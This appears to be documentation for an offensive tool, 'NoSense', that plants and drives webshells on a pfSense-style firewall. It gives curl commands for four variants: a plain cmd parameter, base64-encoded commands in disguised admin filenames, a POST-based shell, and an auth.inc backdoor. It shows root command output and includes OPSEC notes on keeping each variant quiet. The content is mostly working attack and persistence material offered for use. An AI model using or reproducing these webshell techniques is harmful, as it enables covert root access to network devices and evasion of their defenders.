# Option 2: Access WebShell

- Doesn't require credentials to execute commands once uploaded.

## Skidy:
Enabled through option `1` at the main menu then select `Skidy`.

Manual:
```bash
$ curl http://192.168.1 90.190/shell.php?cmd=id 

<pre>uid=0(root) gid=0(wheel) groups=0(wheel)
</pre> 
```
Through NoSense:
```bash
Pick One: 
(1) Skidy
(2) Amatuer
(3) Pro
(4) Leet
-> 1
$: id
uid=0(root) gid=0(wheel) groups=0(wheel)
```
### OPSEC:
1 request sent:
- 1 GET request sent to `/shell.php` this contains a `cmd` variable in the URL.

---
## Amatuer:
Enabled through option `1` at the main menu then select `Amatuer`.

Manual:
```bash
$ curl 192.168.190.190/vpn_l2tp_admin.php?c=aWQK

<pre>uid=0(root) gid=0(wheel) groups=0(wheel)
</pre>  
```
Through NoSense:
```bash
Pick One: 
(1) Skidy
(2) Amatuer
(3) Pro
(4) Leet
-> 2
$: id
uid=0(root) gid=0(wheel) groups=0(wheel)
```
### OPSEC:
1 request sent:
- 1 GET request sent to `/vpn_l2tp_admin.php` this contains a `c` variable in the URL.
---
## Pro:
Enabled through option `1` at the main menu then select `Pro`.

Manual:
```bash
curl -i -s -k -X $'POST' -H $'Host: 192.168.190.190' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 15' --data-binary $'settings=aWQ%3D' $'http://192.168.190.190/system_firewall_manager.php'
```
Through NoSense:
```bash
Pick One: 
(1) Skidy
(2) Amatuer
(3) Pro
(4) Leet
-> 3
$: id
uid=0(root) gid=0(wheel) groups=0(wheel)
```
### OPSEC:
1 request sent:
- 1 POST request sent to `/system_firewall_manager.php` this contains a `settings` variable in the POST data.
---

## Leet:
Enabled through option `10` at the main menu.

`auth.inc` is altered to adjust the functionality of root `/` allowing for a webshell to be created. This takes a POST request and reads the `logindata` of the request. This will be an encoded command.

Manual:

Would not advise doing manually due to CSRF tokens etc.

Through NoSense:
```bash
Pick One: 
(1) Skidy
(2) Amatuer
(3) Pro
(4) Leet
-> 4
$: id
uid=0(root) gid=0(wheel) groups=0(wheel)
```


### OPSEC:
- 1 GET request to root `/` (this is to obtain the PHPSESSID and csrfMagicToken)
- 1 POST request to root `/` with csrfMagicToken and `logindata` as variables in the POST data.